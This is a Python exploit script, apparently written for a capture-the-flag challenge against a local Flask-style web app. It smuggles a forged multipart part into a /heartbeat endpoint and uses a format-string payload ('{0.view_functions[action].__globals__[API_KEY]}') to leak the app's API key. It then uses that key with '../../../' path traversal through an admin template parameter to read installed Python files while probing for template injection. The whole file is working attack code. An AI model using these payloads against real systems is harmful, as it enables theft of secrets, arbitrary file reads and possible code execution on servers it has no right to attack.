import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=5.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), -1

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 测试一些 Python 包的文件
# 寻找包含 {{ 或 }} 的文件
test_files = [
    # Jinja2 包
    '../../../usr/local/lib/python3.13/site-packages/jinja2/defaults.py',
    '../../../usr/local/lib/python3.13/site-packages/jinja2/filters.py',
    '../../../usr/local/lib/python3.13/site-packages/jinja2/compiler.py',
    
    # pip 相关
    '../../../usr/local/lib/python3.13/site-packages/pip/_vendor/rich/_export_format.py',
    '../../../usr/local/lib/python3.13/site-packages/pip/_internal/commands/completion.py',
    
    # string 模块
    '../../../usr/local/lib/python3.13/string.py',
    
    # pydoc
    '../../../usr/local/lib/python3.13/pydoc_data/topics.py',
]

for f in test_files:
    content, status = read_file_via_admin(api_key, f)
    print(f"\n[{f}] Status: {status}")
    if status == 500:
        print("  -> SSTI triggered! (500 error)")
    elif status == 200:
        # 检查内容是否包含被执行的痕迹
        if '{{' in content[:500]:
            print("  -> Contains {{ but was not executed")
        print(f"  Content length: {len(content)}")
